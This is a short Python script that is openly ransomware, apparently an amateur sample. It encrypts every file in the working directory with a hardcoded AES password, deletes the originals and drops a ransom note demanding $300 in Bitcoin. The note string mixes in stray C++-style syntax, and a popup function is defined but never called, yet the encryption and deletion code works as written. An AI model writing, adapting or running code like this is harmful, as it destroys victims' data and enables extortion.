import pyAesCrypt
import time
import os
import sys


note = """YOUR FILES HAVE BEEN ENCRYPTED WITH MY RANSOMWARE! THIS IS YOUR ONLY CHANCE TO CONTACT ME AND DECRYPT!\n
          \nHow to get the key\n
          "\n"
          "    Send 300$ Bitcoin to this address [Wallet Address]. (You can buy Bitcoin here)\n"
          "    Send email to this address [myemail@email.com] your transaction ID, your email address and your decryption code [" << rsa_key << "]. You will get an email with the key to decrypt after 12 - 48 hours.\n"
          "Your decrypt.exe program is in C:\\PerfLogs
"""
note_file_name = "You_have_been_Encrypted.txt"
def put_note():
	with open(note_file_name,"w") as f:
		f.write(note)
		f.close()
	return 0

def popup_window():
	os.startfile(note_file_name)
	return 0


def files():
	full_files = []
	contents = os.listdir()
	for f in contents:
		if os.path.isfile(f):
			full_files.append(f)
	return full_files

#print(dd)

def encrypt():
	password = "bm9vcl9lbmNyeXB0X2FuZF9kZWNyeXB0X3JhbnNvbXdhcmUK"
	ext = ".enc"
	files_to_enc = files()
	for fil in files_to_enc:
		if fil == sys.argv[0]:
			pass
		else:
			pyAesCrypt.encryptFile(fil, fil + ext , password)
			os.remove(fil)


	# decrypt
	#pyAesCrypt.decryptFile("data.txt.aes", "dataout.txt", password)
	return 0


encrypt()

put_note()


